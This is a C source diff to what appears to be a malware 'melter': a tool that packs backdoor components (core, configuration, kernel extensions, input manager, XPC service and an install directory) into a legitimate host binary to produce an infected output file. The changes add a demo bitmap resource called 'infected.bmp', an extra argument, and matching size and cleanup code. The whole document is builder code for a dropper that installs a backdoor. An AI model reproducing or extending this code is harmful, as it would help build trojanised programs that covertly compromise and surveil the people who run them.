@@ -255,6 +255,10 @@ int appendData (char *inputFilePointer,
   char *inputManagerFileName  = basename(inputManagerFilePath);
   char *XPCFileName           = basename(XPCFilePath);
   char *iconFileName          = basename(iconFilePath);
+  char *bitmapFileName		  = NULL;
+  if(strcmp(bitmapFilePath, "null"))
+	  bitmapFileName		  = "infected.bmp";
+
   char *inputFileName         = basename(inputFilePath);
   char *outputFileName        = basename(outputFilePath);
 
@@ -316,7 +320,7 @@ int appendData (char *inputFilePointer,
           exit (1);
         }
     }
-  
+
   //
   // Now append the crt start routine (__malloc_initialize error fix)
   //
@@ -361,11 +365,10 @@ int appendData (char *inputFilePointer,
          sizeof(resourceHeader));
   
   offset += sizeof(resourceHeader);
-
+      
 #ifdef WIN32
   if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
                                  &tempFD, &tempFDMap, 0)) == NULL)
-
 #else
   if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
                                  &tempFD, 0)) == NULL)
@@ -378,6 +381,7 @@ int appendData (char *inputFilePointer,
   memcpy(outputFilePointer + offset,
          tempFilePointer,
          gCoreFileSize);
+
   offset += gCoreFileSize;
   
   tempFileSize = 0;
@@ -675,6 +679,54 @@ int appendData (char *inputFilePointer,
 
   tempFilePointer = NULL;
 #endif
+
+  
+  if(bitmapFileName != NULL)
+    {
+	  // Bitmap file for demo
+	  resource.type = RESOURCE_BITMAP;
+	  memset (resource.name, 0, sizeof (resource.name));
+	  memcpy (resource.name, bitmapFileName, sizeof (resource.name));
+	  resource.size = gBitmapFileSize;
+	  memset (resource.path, 0, sizeof (resource.path));
+	  memcpy (resource.path, installPath, sizeof (resource.path));
+
+	  memcpy (outputFilePointer + offset,
+			&resource,
+			sizeof (resourceHeader));
+
+	  offset += sizeof (resourceHeader);
+#ifdef WIN32
+	  if ((tempFilePointer = mapFile (bitmapFilePath, &tempFileSize,
+	    	&tempFD, &tempFDMap, 0)) == NULL)
+#else 
+	  if ((tempFilePointer = mapFile (bitmapFilePath, &tempFileSize,
+		&tempFD, 0)) == NULL)
+#endif
+		{
+		  printf("[ee] Error while mmapping the bitmap file\n");
+		  exit (1);
+		}
+
+	  memcpy (outputFilePointer + offset,
+			tempFilePointer,
+			gBitmapFileSize);
+  
+	  offset += gBitmapFileSize;
+	  tempFileSize = 0;
+
+#ifdef WIN32
+	  if(tempFilePointer != NULL)
+	      UnmapViewOfFile(tempFilePointer);
+	
+	  CloseHandle(tempFDMap);
+	  CloseHandle(tempFD);
+#else
+	  close (tempFD);
+
+	  tempFilePointer = NULL;
+#endif
+  }
 
   return offset;
 }
@@ -1381,7 +1433,7 @@ void
 usage(_mChar *aBinaryName)
 {
 #ifdef WIN32
-	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <input> <output>\n\n", aBinaryName);
+	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <bitmap> <input> <output>\n\n", aBinaryName);
 #else
   printf("\nUsage: %s <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <input> <output>\n\n", aBinaryName);
 #endif
@@ -1393,6 +1445,7 @@ usage(_mChar *aBinaryName)
   printf("\t<xpc>      : xpc service\n");
   printf("\t<icon>     : icon\n");
   printf("\t<dirname>  : backdoor dir name\n");
+  printf("\t<bitmap>   : bitmap image for demo\n");
   printf("\t<input>    : binary to melt with\n");
   printf("\t<output>   : output filename\n\n");
 }
@@ -1400,7 +1453,7 @@ usage(_mChar *aBinaryName)
 int
 parseArguments(int argc, _mChar **argv)
 {
-	if (argc != 11)
+	if (argc != 12)
     {
       return kErrorGeneric;
     }
@@ -1429,8 +1482,24 @@ parseArguments(int argc, _mChar **argv)
   XPCFilePath           = argv[6];
   iconFilePath          = argv[7];
   installPath           = argv[8];
-  inputFilePath         = argv[9];
-  outputFilePath        = argv[10];
+  bitmapFilePath		= argv[9];
+  inputFilePath         = argv[10];
+  outputFilePath        = argv[11];
+
+#ifdef DEBUG_VERBOSE
+  printf("coreFilePath: %s\n confFilePath: %s\n kext32FilePath: %s\n kext64FilePath: %s\n inputManagerFilePath: %s\n XPCFilePath: %s\n iconFilePath: %s\n installPath: %s\n bitmapFilePath: %s\n  inputFilePath: %s\n outputFilePath: %s\n",
+	coreFilePath,
+	confFilePath,
+	kext32FilePath,
+	kext64FilePath,
+	inputManagerFilePath,
+	XPCFilePath,
+	iconFilePath,
+	installPath,
+	bitmapFilePath,
+	inputFilePath,
+	outputFilePath);
+#endif 
 
   return kSuccess;
 }
@@ -1444,14 +1513,16 @@ void freeArguments()
 		free(confFilePath);
 	if (kext32FilePath != NULL)
 		free(kext32FilePath);
-  if (kext64FilePath != NULL)
+	if (kext64FilePath != NULL)
 		free(kext64FilePath);
-  if (inputManagerFilePath != NULL)
+	if (inputManagerFilePath != NULL)
 		free(inputManagerFilePath);
-  if (XPCFilePath != NULL)
+	if (XPCFilePath != NULL)
 		free(XPCFilePath);
-  if (iconFilePath != NULL)
+	if (iconFilePath != NULL)
 		free(iconFilePath);
+	if (bitmapFilePath != NULL)
+		free(bitmapFilePath);
 	if (installPath != NULL)
 		free(installPath);
 	if (inputFilePath != NULL)
@@ -1561,6 +1632,18 @@ main(int argc, _mChar *argv[])
       exit (1);
     }
 
+  if(strcmp(bitmapFilePath, "null"))
+    {
+	  if ((gBitmapFileSize = getFileSize(bitmapFilePath)) == kErrorGeneric)
+	    {
+	      printf("[ee] Bitmap file not found\n");
+
+	      exit (1);
+        }
+	  gNumberOfResources++;
+  }
+  else
+	  gBitmapFileSize = 0;
   // Map input file
 #ifdef WIN32
   if ((inputFilePointer = mapFile(inputFilePath,
@@ -1592,6 +1675,7 @@ main(int argc, _mChar *argv[])
                     + gInputManagerFileSize
                     + gXPCFileSize
                     + gIconFileSize
+					+ gBitmapFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
                     + sizeof (resourceHeader) * gNumberOfResources;
